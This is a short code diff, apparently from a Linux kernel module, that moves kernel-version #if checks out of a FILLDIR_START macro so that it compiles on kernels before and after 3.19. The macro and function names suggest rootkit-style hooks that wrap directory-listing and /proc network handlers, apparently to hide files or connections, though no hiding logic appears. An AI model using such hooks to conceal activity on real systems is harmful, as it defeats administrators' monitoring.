@@ -875,15 +875,20 @@ static int n_udp6_seq_show ( struct seq_file *seq, void *v )
 // Decreses risk of "copy-paste & forgot to rename" error.
 
 //static int NAME##_filldir(void * context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type)
-#define FILLDIR_START(NAME) \
-    filldir_t original_##NAME##_filldir; \
-    \
-    #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0) \
-    static int NAME##_filldir(void *context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
-    #else \
-    static int NAME##_filldir(struct dir_context *context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
-    #endif \
-    {
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
+	#define FILLDIR_START(NAME) \
+	    filldir_t original_##NAME##_filldir; \
+	    \
+	    static int NAME##_filldir(void *context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
+	    {
+#else
+	#define FILLDIR_START(NAME) \
+	    filldir_t original_##NAME##_filldir; \
+	    \
+	    static int NAME##_filldir(struct dir_context *context, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) \
+            {
+#endif
 
 #define FILLDIR_END(NAME) \
         return original_##NAME##_filldir(context, name, namelen, offset, ino, d_type); \
